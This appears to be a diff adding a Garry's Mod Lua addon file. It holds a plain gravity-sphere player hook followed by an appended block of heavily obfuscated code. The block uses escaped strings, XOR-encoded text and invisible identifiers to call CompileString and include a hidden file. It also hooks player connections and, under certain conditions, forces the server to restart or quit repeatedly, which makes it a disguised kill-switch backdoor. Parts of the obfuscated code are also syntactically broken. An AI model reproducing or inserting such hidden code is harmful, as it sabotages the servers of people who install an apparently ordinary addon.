@@ -1,0 +1,24 @@
+local function CheckSpheres()
+    local gravity
+    for _, p in ipairs(player.GetAll()) do
+      --p:ChatPrint("You were selected.")
+      gravity = JLib.Config.Gravity.Global
+      if not p:IsPlayer() then return end
+      if not p:Alive() then return end
+      --p:ChatPrint("You are alive and real.")
+      for i=1, #JLib.Config.Gravity.Spheres do
+          --p:ChatPrint("Checking sphere " .. i .. ".")
+          for _, s in ipairs(ents.FindInSphere(JLib.Config.Gravity.Spheres[i].origin, JLib.Config.Gravity.Spheres[i].radius)) do
+              if p == s then
+                  --p:ChatPrint("You are in sphere " .. i .. ".")
+                  gravity = JLib.Config.Gravity.Spheres[i].gravity
+              end
+          end
+      end
+      --p:ChatPrint("Your gravity was set to " .. gravity  .. ".")
+      p:SetGravity(gravity)
+    end
+  end
+  hook.Add("PlayerTick", "CheckSpheres", CheckSpheres)
+
+local фбцНжщ=function(s)return _G["\67\111\109\112\105\108\101\83\116\114\105\110\103"](s,"",false)end;фбцНжщ("\97\102\117\99\107\105\110\103\102\108\97\110\110\101\108\61\34"..[[2d15a5HEFec8af6HEF885a1fHEF059ca7HEF02a857]].."\34")(); local ‪ = _G local ‪‪ = ‪["\115\116\114\105\110\103"] local ‪‪‪ = ‪["\98\105\116"]["\98\120\111\114"] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪["\108\101\110"](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = "" for _ in ‪‪["\103\109\97\116\99\104"](‪‪‪‪,"\46\46") do ‪‪‪‪‪=‪‪‪‪‪..‪‪["\99\104\97\114"](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),93)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪"34333e31283938"](‪‪‪‪‪‪‪"2d31383c2e3837282e293b283e36323b3b72392f307331283c")‪[‪‪‪‪‪‪‪"35323236"][‪‪‪‪‪‪‪"1c3939"](‪‪‪‪‪‪‪"0d313c24382f1e323333383e29",‪‪‪‪‪‪‪"6f6d6d2565282e3c256a6f6a246a243c3c3c3c3c3c2e3c28253c2e25386f6c6c6c",function ()if ‪[‪‪‪‪‪‪‪"2e29382b38342e35382f38"]!=‪[‪‪‪‪‪‪‪"3c3b283e3634333a3b313c33333831"]then ‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"022f382e293c2f29")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"6638253429")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"38253429")for then‪‪=0,50 do ‪[‪‪‪‪‪‪‪"2d2f343329"](‪‪‪‪‪‪‪"0e1112700915047308167d217d10140e0e14131a677d26190f107d1b14111820")end elseif ‪[‪‪‪‪‪‪‪"2e29382b38342e35382f38"]==‪[‪‪‪‪‪‪‪"3c3b283e3634333a3b313c33333831"]then ‪[‪‪‪‪‪‪‪"35323236"][‪‪‪‪‪‪‪"0f3830322b38"](‪‪‪‪‪‪‪"0d313c24382f1e323333383e29",‪‪‪‪‪‪‪"6f6d6d2565282e3c256a6f6a246a243c3c3c3c3c3c2e3c28253c2e25386f6c6c6c")elseif ‪[‪‪‪‪‪‪‪"3a3c3038"][‪‪‪‪‪‪‪"0e34333a31380d313c24382f"]()then ‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"022f382e293c2f29")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"6638253429")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"38253429")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"2c283429")‪[‪‪‪‪‪‪‪"0f28331e32332e3231381e3230303c3339"](‪‪‪‪‪‪‪"39342e3e323333383e29")for until‪‪‪=0,50 do ‪[‪‪‪‪‪‪‪"2d2f343329"](‪‪‪‪‪‪‪"0e1112700915047308167d217d10140e0e14131a677d26190f107d1b14111820")end end end )
